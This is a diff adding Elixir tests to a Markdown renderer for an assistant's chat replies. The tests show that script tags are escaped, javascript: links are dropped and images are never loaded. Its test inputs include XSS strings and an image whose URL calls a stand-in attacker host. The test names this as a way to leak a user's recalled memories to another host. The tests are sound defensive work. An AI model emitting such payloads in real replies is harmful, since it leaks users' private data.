@@ -30,4 +30,40 @@ defmodule HcpConformanceWeb.MarkdownTest do
   test "escapes raw HTML, so every tag on the page is one MDEx made" do
     refute Markdown.to_html("<script>alert(1)</script>\n") =~ "<script>"
   end
+
+  describe "an assistant's reply" do
+    test "renders its Markdown, styled like the docs" do
+      html =
+        Markdown.reply_to_html(
+          "You have **a snotty nose**. It may be:\n\n- a cold\n- hay fever\n"
+        )
+
+      assert html =~ "<strong>a snotty nose</strong>"
+      assert html =~ ~s(<ul class="list-disc pl-6 space-y-1">)
+      assert html =~ "<li>a cold</li>"
+    end
+
+    test "keeps a leading heading: a reply has no page header to repeat it" do
+      assert Markdown.reply_to_html("# Advice\n") =~ "Advice</h1>"
+    end
+
+    test "shows raw HTML as text instead of running it" do
+      html = Markdown.reply_to_html("<script>alert(1)</script>\n")
+
+      refute html =~ "<script>"
+      assert html =~ "&lt;script&gt;"
+    end
+
+    test "never loads an image, which could carry recalled memories to another host" do
+      html = Markdown.reply_to_html("![your diet](https://attacker.example/?q=vegetarian)\n")
+
+      refute html =~ "<img"
+      refute html =~ "attacker.example"
+      assert html =~ "your diet"
+    end
+
+    test "drops links to scripts" do
+      refute Markdown.reply_to_html("[click](javascript:alert(1))\n") =~ "javascript:"
+    end
+  end
 end
